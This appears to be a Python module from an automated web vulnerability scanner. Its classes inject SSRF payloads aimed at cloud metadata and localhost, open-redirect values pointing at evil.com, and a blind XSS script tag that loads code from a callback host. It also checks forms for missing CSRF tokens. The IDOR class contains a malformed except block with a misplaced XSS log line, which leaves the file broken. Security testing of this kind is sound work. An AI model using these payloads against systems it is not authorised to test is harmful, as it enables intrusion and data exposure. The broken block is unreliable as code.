"""
Advanced Skills - v1.6 advanced vulnerability testing capabilities.

Contains:
    - SSRFSkill: Server-Side Request Forgery detection
    - IDORSkill: Insecure Direct Object Reference
    - OpenRedirectSkill: Open redirect detection
    - OOBXSSSkill: Blind XSS with Interactsh callbacks
    - CSRFSkill: Cross-Site Request Forgery detection
"""

from typing import Dict, Any
from .base import BaseSkill
from bugtrace.utils.logger import get_logger

logger = get_logger("skills.advanced")


class SSRFSkill(BaseSkill):
    """SSRF exploitation skill - Server-Side Request Forgery detection."""
    
    description = "Test for SSRF by injecting internal URLs and callback endpoints"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        import httpx
        
        findings = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        # SSRF parameters to test
        ssrf_params = ["url", "uri", "path", "dest", "redirect", "go", "out", "next", "target", "callback"]
        
        # SSRF payloads
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://127.0.0.1:22/",
            "http://localhost:80/",
            "http://[::1]/",
        ]
        
        for param_name in query_params:
            if any(x in param_name.lower() for x in ssrf_params):
                for payload in ssrf_payloads:
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urlencode(test_params, doseq=True), parsed.fragment
                    ))
                    
                    try:
                        async with httpx.AsyncClient(timeout=10.0) as client:
                            response = await client.get(test_url)
                            
                            # Look for SSRF indicators in response
                            ssrf_indicators = [
                                "ami-id", "instance-id", "localhost", "127.0.0.1"
                            ]
                            
                            for indicator in ssrf_indicators:
                                if indicator in response.text:
                                    findings.append({
                                        "type": "SSRF",
                                        "url": url,
                                        "parameter": param_name,
                                        "payload": payload,
                                        "evidence": indicator,
                                        "severity": "HIGH",
                                        "description": f"Server-Side Request Forgery (SSRF) detected. The parameter '{param_name}' allows making requests to internal resources. Indicator found: {indicator}",
                                        "reproduction": f"curl '{test_url}' | grep -i '{indicator}'"
                                    })
                                    logger.info(f"[{self.master.name}] ✅ SSRF detected: {indicator}")
                                    break
                    except Exception as e:
                        logger.debug(f"SSRF/IDOR/OpenRedirect test failed: {e}")
        
        return {"success": True, "findings": findings}


class IDORSkill(BaseSkill):
    """IDOR exploitation skill - Insecure Direct Object Reference detection."""
    
    description = "Test for IDOR by manipulating ID parameters"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        import httpx
        
        findings = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        # ID parameters to test
        id_params = ["id", "user_id", "uid", "account", "order", "file", "doc", "page"]
        
        for param_name in query_params:
            if any(x in param_name.lower() for x in id_params):
                original_value = query_params[param_name][0]
                
                # Try common IDOR values
                test_values = ["1", "0", "admin", "-1"]
                
                # Try incrementing/decrementing if numeric
                try:
                    int_val = int(original_value)
                    test_values.append(str(int_val + 1))
                    test_values.append(str(int_val - 1))
                except ValueError:
                    pass
                
                for test_val in test_values:
                    if test_val == original_value:
                        continue
                        
                    test_params = query_params.copy()
                    test_params[param_name] = [test_val]
                    
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urlencode(test_params, doseq=True), parsed.fragment
                    ))
                    
                    try:
                        async with httpx.AsyncClient(timeout=10.0) as client:
                            response = await client.get(test_url)
                            
                            # If 200 OK with different value, potential IDOR
                            if response.status_code == 200:
                                findings.append({
                                    "type": "IDOR (Potential)",
                                    "url": url,
                                    "parameter": param_name,
                                    "original_value": original_value,
                                    "tested_value": test_val,
                                    "note": "Manual verification required",
                                    "severity": "MEDIUM",
                                    "description": f"Potential Insecure Direct Object Reference (IDOR). Parameter '{param_name}' accepts different ID values ({original_value} → {test_val}) returning 200 OK. Manual verification needed to confirm unauthorized data access.",
                                    "reproduction": f"# Original: curl '{url}'\n# IDOR test: curl '{test_url}'"
                                })
                                logger.info(f"[{self.master.name}] ⚠️ Potential IDOR on {param_name}")
                                break
                    except Exception as e:
                logger.debug(f"OOB XSS payload injection failed: {e}")
        
        return {"success": True, "findings": findings}


class OpenRedirectSkill(BaseSkill):
    """Open Redirect exploitation skill."""
    
    description = "Test for Open Redirect vulnerabilities"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        import httpx
        
        findings = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        # Redirect parameters to test
        redirect_params = ["url", "redirect", "next", "return", "goto", "target", "dest", "redir"]
        
        # Redirect payloads
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com%2F%2F",
        ]
        
        for param_name in query_params:
            if any(x in param_name.lower() for x in redirect_params):
                for payload in redirect_payloads:
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urlencode(test_params, doseq=True), parsed.fragment
                    ))
                    
                    try:
                        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
                            response = await client.get(test_url)
                            
                            # Check redirect headers
                            location = response.headers.get("location", "")
                            if "evil.com" in location:
                                findings.append({
                                    "type": "Open Redirect",
                                    "url": url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "redirected_to": location,
                                    "severity": "MEDIUM",
                                    "description": f"Open Redirect vulnerability. Parameter '{param_name}' allows redirecting users to external domains. Server redirects to: {location}",
                                    "reproduction": f"curl -I '{test_url}' | grep -i location"
                                })
                                logger.info(f"[{self.master.name}] ✅ Open Redirect: {location}")
                                break
                    except:
                        pass
        
        return {"success": True, "findings": findings}


class OOBXSSSkill(BaseSkill):
    """OOB XSS skill using Interactsh for blind XSS detection."""
    
    description = "Test for Blind XSS using out-of-band callbacks"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        from bugtrace.tools.interactsh import get_oob_url
        import httpx
        
        findings = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        callback_urls = []
        
        for param_name in query_params:
            # Generate unique callback for this param
            callback = get_oob_url(f"xss_{param_name}")
            callback_urls.append((param_name, callback))
            
            # Blind XSS payload
            payload = f'"><script src=http://{callback}/x></script>'
            
            test_params = query_params.copy()
            test_params[param_name] = [payload]
            
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
            ))
            
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    await client.get(test_url)
            except:
                pass
        
        # Log callback URLs for user reference
        if callback_urls:
            logger.info(f"[{self.master.name}] OOB XSS payloads sent. Monitor callbacks:")
            for param, cb in callback_urls:
                logger.info(f"  - {param}: {cb}")
            
            callbacks_dict = {param: cb for param, cb in callback_urls}
            findings.append({
                "type": "Blind XSS (Payload Sent)",
                "url": url,
                "callbacks": callbacks_dict,
                "note": "Monitor Interactsh for callbacks",
                "severity": "INFO",
                "description": f"Blind XSS payloads injected into {len(callback_urls)} parameters. If callbacks are received on Interactsh, XSS is confirmed. Payloads execute when viewed by admin/other users.",
                "reproduction": f"# Monitor these callback URLs for hits:\n" + "\n".join([f"# {p}: {c}" for p, c in callback_urls[:3]])
            })
        
        return {"success": True, "findings": findings}


class CSRFSkill(BaseSkill):
    """CSRF exploitation skill - Cross-Site Request Forgery detection."""
    
    description = "Test for CSRF by analyzing forms for missing anti-CSRF tokens"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        
        try:
            from bugtrace.tools.visual.crawler import VisualCrawler
            crawler = VisualCrawler()
            crawl_results = await crawler.crawl(url, max_depth=1)
            
            for form in crawl_results.get("forms", []):
                action = form.get("action", "")
                method = form.get("method", "GET").upper()
                inputs = form.get("inputs", [])
                
                # CSRF is mainly relevant for state-changing methods (POST, PUT, DELETE)
                if method != "GET":
                    # Check for common CSRF token names
                    csrf_tokens = ["csrf", "xsrf", "token", "authenticity", "state"]
                    has_token = False
                    
                    for inp in inputs:
                        name = (inp.get("name") or "").lower()
                        if any(t in name for t in csrf_tokens):
                            has_token = True
                            break
                    
                    if not has_token:
                        findings.append({
                            "type": "CSRF (Potential)",
                            "url": url,
                            "form_action": action,
                            "method": method,
                            "note": "Form missing apparent CSRF token",
                            "severity": "MEDIUM",
                            "description": f"Potential Cross-Site Request Forgery (CSRF). Form with action '{action}' uses {method} method but lacks CSRF token protection. State-changing actions may be exploitable.",
                            "reproduction": f"# Create CSRF PoC:\n<form action='{action}' method='{method}'>\n  <!-- Add form inputs -->\n  <input type='submit' value='Submit'>\n</form>"
                        })
                        logger.info(f"[{self.master.name}] ⚠️ Potential CSRF on form: {action}")
                        
        except Exception as e:
            logger.debug(f"CSRF skill failed: {e}")
            
        return {"success": True, "findings": findings}
